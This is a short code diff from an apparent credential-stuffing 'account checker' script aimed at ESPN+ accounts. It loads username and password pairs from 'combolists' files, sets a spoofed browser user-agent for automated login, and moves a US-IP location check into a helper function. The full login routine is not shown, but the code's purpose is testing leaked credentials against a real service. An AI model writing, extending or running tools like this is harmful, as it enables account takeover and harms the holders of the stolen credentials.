@@ -17,17 +17,12 @@ def espn():
 	file_directory = str(Path(__file__).parents[1])+'/combolists/espn'
 	plain_directory = str(Path(__file__).parents[1])
 	page = 'https://plus.espn.com/'
-	ip, country = ip_country()
-	if 'US' not in str(country):
-		print('Current IP: {}'.format(str(ip)))
-		print('Current Location: {}'.format(country))
-		print('Please use a US IP to check accounts.\nEnding.')
-		exit()
-	splitter = ComboSplitter(file_directory, "espn")
+	ip_country('espn')
 	try:
+		splitter = ComboSplitter(file_directory, "espn")
 		users, passwords = splitter.split_file()
 	except TypeError:
-		splitter.return_error()
+		splitter.return_error(plain_directory + '/combolists/')
 		exit()
 	browser_options = Options()
 	browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
